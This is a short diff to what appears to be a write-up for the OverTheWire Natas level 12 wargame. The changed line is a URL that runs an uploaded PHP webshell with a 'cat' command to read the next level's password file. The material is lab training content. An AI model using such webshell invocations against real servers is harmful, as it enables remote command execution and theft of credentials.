@@ -21,5 +21,5 @@ to
 now execute the webshell  
 
 ```
-http://natas12.natas.labs.overthewire.org/upload/k5uwtdrxxt.php?e=cat /etc/natas_webpass
+http://natas12.natas.labs.overthewire.org/upload/k5uwtdrxxt.php?e=cat /etc/natas_webpass/natas13
 ```
